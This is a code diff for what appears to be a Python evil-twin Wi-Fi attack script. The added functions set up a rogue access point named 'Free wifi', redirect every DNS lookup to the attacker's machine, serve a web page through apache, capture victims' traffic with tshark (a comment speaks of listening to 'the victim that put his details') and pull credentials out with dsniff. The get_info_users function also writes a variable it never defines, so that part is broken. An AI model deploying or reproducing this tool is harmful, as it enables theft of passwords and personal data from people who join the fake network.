@@ -78,11 +78,35 @@
 
 
 import os
-import signal
-import time
+# import signal
+# import time
 
+def Create_hostapd(iface, ssid="Free wifi", channel=1):
+    interface_str= "interface="+str(iface)+"\n"
+    driver_str="driver=nl80211\n"
+    ssid_str= "ssid="+str(ssid)+"\n"
+    channel_str = "channel="+str(channel)+" \n"
+    conf_str= interface_str+driver_str+ssid_str+channel_str
+    f = open("hostapd.conf", "w+")
+    f.write(conf_str)
+    os.chmod("hostapd.conf",0o777)
 
-def reset_setting():
+#configure dnsmasq to be used as a DHCP server and DNS server.
+def Create_dnsmasq(iface):
+    iface_str= "interface="+str(iface)+""
+    body_str= "\ndhcp-range=192.168.1.2,192.168.1.250,12h"
+    body_str+="\ndhcp-option=3,192.168.1.1"
+    body_str+="\ndhcp-option=6,192.168.1.1"
+    body_str+="\naddress=/#/192.168.1.1"
+    conf_str = iface_str+body_str
+    f = open("dnsmasq.conf", "w+")
+    f.write(conf_str)
+    os.chmod("dnsmasq.conf",0o777)   
+
+def Delete_conf_files():
+    os.system("rm *.conf")
+
+def init_setting():
     os.system('sudo airmon-ng check kill')
 
     os.system('service NetworkManager start')
@@ -104,9 +128,7 @@ def reset_setting():
     os.system(' pkill -9 dhclient')
     os.system('killall dnsmasq >/dev/null 2>&1')
     os.system('killall hostapd >/dev/null 2>&1')
-    # os.system("ifconfig "+ iface +" 10.0.0.1 netmask 255.255.255.0")
-    #os.system('route add default gw 10.0.0.1')
-    #
+    
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     os.system('iptables --flush')
     os.system('iptables --table nat --flush')
@@ -114,18 +136,19 @@ def reset_setting():
     os.system('iptables --table nat --delete-chain')
     os.system('iptables -P FORWARD ACCEPT')
 
-
-
-
 def AP_on(iface):
     os.system('sudo dnsmasq -C dnsmasq.conf')
     os.system('sudo hostapd hostapd.conf -B')
     os.system("sudo ifconfig " + str(iface) + " 192.168.1.1/24")
     os.system("service apache2 start")
+    os.system("sudo tshark -i "+ str(iface) +" -w captureAP") #listen to the victim that put his details
+    
+def get_info_users():
+    os.system("sudo dsniff -p captureAP")
+    f = open("dnsmasq.conf", "w+")
+    f.write(conf_str)
 
-
-def start(iface):
-    reset_setting()
-    AP_on(iface)
-    # empty = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
-    # reset_setting()
+# def setup(iface):
+#     init_setting()
+#     AP_on(iface)
+#     # reset_setting()
